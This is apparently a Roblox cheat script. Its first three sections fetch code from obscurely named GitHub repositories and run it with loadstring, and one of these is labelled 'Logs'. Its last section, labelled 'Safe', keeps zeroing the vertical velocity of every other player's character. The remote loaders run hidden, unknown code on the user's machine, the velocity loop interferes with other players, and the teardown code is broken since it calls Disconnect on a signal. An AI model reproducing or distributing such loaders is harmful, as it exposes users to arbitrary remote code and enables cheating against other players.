--Main
loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/aehtnpopoaoerjpofehnajpo225236/main/hreajettsrka4658846545969", true))()

--Logs
loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/wgrijndsapmoioiesrdmvipso324326523523/main/sfasfdrhadfgsad3253467457sdfgdfshfdhjj", true))()

--Other
loadstring(game:HttpGet("https://raw.githubusercontent.com/fdsmogk/htsrshtroipndsoijdshtjoihdtsff0hoihjsi/main/fjfszfjtsjdtzsj", true))()

--Safe
local RunService = game:GetService("RunService")

local function zeroOutYVelocity(hrp)
    hrp.Velocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
    hrp.AssemblyLinearVelocity = Vector3.new(hrp.Velocity.X, 0, hrp.Velocity.Z)
end

local function onPlayerAdded(player)
    player.CharacterAdded:Connect(function(character)
        local hrp = character:WaitForChild("HumanoidRootPart")
        zeroOutYVelocity(hrp)
    end)
end

local function onPlayerRemoving(player)
    player.CharacterAdded:Disconnect()
end

game.Players.PlayerAdded:Connect(onPlayerAdded)
game.Players.PlayerRemoving:Connect(onPlayerRemoving)

RunService.Heartbeat:Connect(function()
    pcall(function()
        for i, player in pairs(game.Players:GetChildren()) do
            if player.Name ~= game.Players.LocalPlayer.Name then
                local hrp = player.Character.HumanoidRootPart
                zeroOutYVelocity(hrp)
            end
        end
    end)
end)
